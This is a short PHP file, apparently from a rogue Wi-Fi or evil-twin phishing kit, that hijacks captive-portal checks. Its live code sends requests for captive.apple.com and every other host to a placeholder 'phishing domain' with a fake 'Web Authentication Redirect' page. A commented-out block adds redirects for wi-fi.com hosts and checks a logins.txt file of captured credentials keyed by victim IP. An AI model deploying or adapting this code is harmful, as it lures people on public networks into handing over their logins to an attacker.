<?php
    /*
	// region Get params
	$server_name = $_SERVER['SERVER_NAME'];
	$client_ip = $_SERVER['REMOTE_ADDR'];
	$page = $_GET['page'];
	// endregion

	// region Site: welcome.wi-fi.com redirect to go.wi-fi.com
	if ($server_name == "welcome.wi-fi.com") {
		header('Location: http://go.wi-fi.com/');
		http_response_code(302);
		echo '<html><body>You are being <a href="http://go.wi-fi.com">redirected</a>.</body></html>';
		exit(0);
	}
	// endregion

	// region Site: go.wi-fi.com redirect to phishing domain
	if ($server_name == "go.wi-fi.com") {
		header('Location: http://se_domain/');
		http_response_code(200);
		echo '<HTML><HEAD><TITLE> Web Authentication Redirect</TITLE><META http-equiv="Cache-control" content="no-cache"><META http-equiv="Pragma" content="no-cache"><META http-equiv="Expires" content="-1"><META http-equiv="refresh" content="1; URL=http://se_domain/"></HEAD></HTML>';
		exit(0);
	}
	// endregion

	// region Checking that the user has already been authenticated
	if ($page == "/success.html") {
		$handle = fopen("se_path/logins.txt", "r");
		if ($handle) {
			while (($line = fgets($handle)) !== false) {
				$pattern = "/^$client_ip .*$/";
				if (preg_match($pattern, $line)) {
					echo "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>";
					fclose($handle);
					exit(0);
				}
			}
			fclose($handle);
		}
	}
	// endregion
	*/

	// region Site: captive.apple.com and other sites redirect to phishing domain
	header('Location: http://se_domain/');
	if ($server_name == "captive.apple.com") {
		http_response_code(200);
	}
	echo '<HTML><HEAD><TITLE> Web Authentication Redirect</TITLE><META http-equiv="Cache-control" content="no-cache"><META http-equiv="Pragma" content="no-cache"><META http-equiv="Expires" content="-1"><META http-equiv="refresh" content="1; URL=http://se_domain/"></HEAD></HTML>';
	exit(0);
	// endregion
